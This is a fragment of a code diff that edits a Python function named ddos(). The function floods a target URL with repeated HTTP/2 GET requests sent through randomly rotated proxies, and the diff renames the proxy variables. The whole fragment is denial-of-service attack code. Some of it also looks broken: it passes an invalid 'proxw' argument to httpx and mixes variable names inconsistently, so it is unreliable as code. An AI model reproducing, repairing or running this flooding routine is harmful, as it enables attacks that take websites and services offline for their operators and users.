@@ -2545,12 +2545,12 @@ def ddos():
             client = httpx.Client(
                 http2=True,
                 proxw={
-                    'http://': 'http://'+random.choice(proxz),
-                    'https://': 'http://'+random.choice(proxz),
+                    'http://': 'http://'+random.choice(proxies),
+                    'https://': 'http://'+random.choice(proxies),
                 }
              )
-            client.get(url, headers=headers, proxw=proxy)
-            client.get(url, headers=headers, proxw=proxy)
+            client.get(url, headers=headers, proxw=proxw)
+            client.get(url, headers=headers, proxw=proxw)
             proxy = {
                     'http': 'http://'+str(random.choice(list(proxz))),   
                     'https': 'http://'+str(random.choice(list(proxz))),
